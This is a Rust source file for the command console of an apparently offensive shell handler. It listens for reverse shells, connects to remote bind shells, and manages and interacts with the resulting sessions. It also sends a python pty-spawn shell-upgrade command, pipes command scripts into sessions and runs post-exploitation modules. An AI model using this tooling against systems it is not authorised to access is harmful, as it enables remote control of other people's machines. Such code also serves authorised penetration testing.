use std::sync::{Arc, Mutex};
use std::io::Write;
use crate::core::session::{SessionManager, Session};
use crate::core::comms::manager::CommsManager;
use crate::core::comms::tcp::TcpComms;
use crate::core::modules::registry::get_modules;
use crate::core::loghandler::LogHandler;
use super::interactive::interact_with_session;
use super::output::send_command_and_print_output;

fn get_session_by_id<'a>(session_manager: &'a Arc<SessionManager>, id_str: &str) -> Option<(usize, Arc<Session>)> {
    match id_str.parse::<usize>() {
        Ok(id) => match session_manager.get(id) {
            Some(session) => Some((id, session)),
            None => {
                LogHandler::warn(&format!("Session {} not found", id_str));
                None
            }
        },
        Err(_) => {
            LogHandler::warn(&format!("Invalid session ID: {}", id_str));
            None
        }
    }
}

pub fn handle_command(cmd: &str, session_manager: &Arc<SessionManager>, comms_manager: &Arc<Mutex<CommsManager>>) {
    let parts: Vec<&str> = cmd.split_whitespace().collect();
    match parts.as_slice() {
        ["help"] => {
            println!("Commands");
            println!("\thelp\t\t\t\tShow this help menu");
            println!("\texit\t\t\t\tQuit the shell");
            println!("\tlisten tcp <port>\t\tStart a TCP listener");
            println!("\tsessions\t\t\tList active sessions");
            println!("\tclose <id>\t\t\tClose a session");
            println!("\tinteract <id>\t\t\tInteract with a session");
            println!("\tupgrade-shell <id>\t\tSend PTY upgrade command to session");
            println!("\trun-script <id> <file>\t\tRun a script of commands on a session");
            println!("\tmodules <platform> <category>\tList available modules");
            println!("\trun-module <name> <id>\t\tRun a module on a session");
            println!("\tmodule-help <name>\t\tShow help for a module");
        }

        ["exit"] => {
            println!("Bye!");
            std::process::exit(0);
        }

        ["listen", "tcp", port_str] => {
            if let Ok(port) = port_str.parse::<u16>() {
                let comms = Arc::new(TcpComms::new(port, Arc::clone(session_manager)));
                comms_manager.lock().unwrap().add_comms(comms.clone());
                LogHandler::info(&format!("[*] Added TCP listener on port {}", port));
            } else {
                LogHandler::error(&format!("Invalid port: {}", port_str));
            }
        }

        ["connect", "tcp", ip, port_str] => {
            if let Ok(port) = port_str.parse::<u16>() {
                let comms = Arc::new(TcpComms::new(0, Arc::clone(session_manager)));
                comms.connect_to_bind_shell(ip, port);
                comms_manager.lock().unwrap().add_comms(comms.clone());
                LogHandler::info(&format!("[*] Connected to bind shell at {}:{}", ip, port));
            } else {
                LogHandler::error(&format!("Invalid port: {}", port_str));
            }
        }

        ["sessions"] => {
            let sessions = session_manager.list_sessions();
            if sessions.is_empty() {
                LogHandler::warn("No active sessions");
            } else {
                println!("{:<8} {:<8} {:<22} {:<20} {:<20}", "ID", "Proto", "Remote", "Started", "Last Active");
                for session in sessions {
                    let remote = session.remote_addr.map(|a| a.to_string()).unwrap_or_else(||"-".to_string());
                    let started = humantime::format_rfc3339_seconds(session.start_time);
                    let last = session.last_active.lock()
                        .map(|t| humantime::format_rfc3339_seconds(*t).to_string())
                        .unwrap_or_else(|_| "-".to_string());
                    println!(
                        "{:<8} {:<8} {:<22} {:<20} {:<20}",
                        session.id,
                        match session.protocol {
                            crate::core::session::Protocol::TCP => "TCP",
                            crate::core::session::Protocol::UDP => "UDP",
                            crate::core::session::Protocol::HTTP => "HTTP",
                        },
                        remote,
                        started,
                        last,
                    );
                }
            }
        }

        ["close", id_str] => {
            if let Some((id, _)) = get_session_by_id(session_manager, id_str) {
                match session_manager.remove(id) {
                    Ok(_) => LogHandler::success(&format!("Session {} closed", id)),
                    Err(e) => LogHandler::error(&format!("Error: {}", e)),
                }
            }
        }

        ["interact", id_str] => {
            if let Some((id, session)) = get_session_by_id(session_manager, id_str) {
                LogHandler::info(&format!("[*] Interacting with session {}", id));
                if let Err(e) = interact_with_session(session_manager.clone(), (*session).clone()) {
                    LogHandler::error(&format!("Interaction ended: {}", e));
                }
            }
        }

        ["upgrade-shell", id_str] => {
            if let Some((id, session)) = get_session_by_id(session_manager, id_str) {
                let upgrade_cmd = "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n";
                let mut locked = match session.stream.lock() {
                    Ok(l) => l,
                    Err(e) => {
                        LogHandler::error(&format!("Failed to lock the session stream: {}", e));
                        return;
                    }
                };
                if let Err(e) = locked.write_all(upgrade_cmd.as_bytes()) {
                    LogHandler::error(&format!("Failed to send upgrade command: {}", e));
                    return;
                }
                if let Err(e) = locked.flush() {
                    LogHandler::error(&format!("Failed to flush upgrade command: {}", e));
                    return;
                }
                LogHandler::success(&format!("[*] Sent PTY upgrade command to session {}", id));
            }
        }

        ["run-script", id_str, script_path] => {
            use std::fs::File;
            use std::io::{BufRead, BufReader};

            if let Some((id, session)) = get_session_by_id(session_manager, id_str) {
                let file = match File::open(script_path) {
                    Ok(f) => f,
                    Err(e) => {
                        LogHandler::error(&format!("Failed to open scripts: {}", e));
                        return;
                    }
                };
                let reader = BufReader::new(file);
                let mut locked = match session.stream.lock() {
                    Ok(l) => l,
                    Err(e) => {
                        LogHandler::error(&format!("Failed to lock the session stream: {}", e));
                        return;
                    }
                };
                for line in reader.lines() {
                    match line {
                        Ok(cmd) => {
                            let trimmed = cmd.trim();
                            if trimmed.is_empty() || trimmed.starts_with('#') {
                                continue;
                            }
                            let cmd_with_newline = format!("{}\n", trimmed);
                            if let Err(e) = send_command_and_print_output(&mut *locked, &cmd_with_newline) {
                                LogHandler::error(&format!("Failed to send command: {}", e));
                                break;
                            }
                        }
                        Err(e) => {
                            LogHandler::error(&format!("Failed to read line: {}", e));
                            break;
                        }
                    }
                }
                LogHandler::success(&format!("[*] Script sent to session {}", id));
            }
        }

        ["modules"] => {
            let modules = get_modules();
            println!("{:<20}{:<12}{:<16}{}", "Name", "Platform", "Category", "Description");
            for m in modules.iter() {
                println!("{:<20}{:<12}{:<16}{}", m.name(), m.platform(), m.category(), m.description());
            }
        }

        ["modules", platform] => {
            let modules = get_modules();
            println!("{:<20}{:<12}{:<16}{}", "Name", "Platform", "Category", "Description");
            for m in modules.iter().filter(|m| m.platform() == *platform) {
                println!("{:<20}{:<12}{:<16}{}", m.name(), m.platform(), m.category(), m.description());
            }
        }

        ["modules", platform, category] => {
            let modules = get_modules();
            println!("{:<20}{:<12}{:<16}{}", "Name", "Platform", "Category", "Description");
            for m in modules.iter().filter(|m| m.platform() == *platform && m.category() == *category) {
                println!("{:<20}{:<12}{:<16}{}", m.name(), m.platform(), m.category(), m.description());
            }
        }

        ["run-module", module_name, id_str, rest @ ..] => {
            if let Some((id, _)) = get_session_by_id(session_manager, id_str) {
                let modules = get_modules();
                if let Some(module) = modules.iter().find(|m| m.name() == *module_name) {
                    let args = rest.iter().map(|s| s.to_string()).collect();
                    module.run(id, session_manager, args);
                    LogHandler::success(&format!("[*] Ran module '{}' on session {}", module_name, id));
                } else {
                    LogHandler::warn(&format!("Module '{}' not found", module_name));
                }
            }
        }
        
        ["module-help", module_name] => {
            let modules = get_modules();
            if let Some(module) = modules.iter().find(|m| m.name() == *module_name) {
                println!("Module: {}", module.name());
                println!("Description: {}", module.description());
                println!("{}", module.usage());
            } else {
                LogHandler::warn(&format!("Module '{}' not found", module_name));
            }
        }

        _ => {
            LogHandler::warn("Unknown command. Type `help` for a list.");
        }
    }
}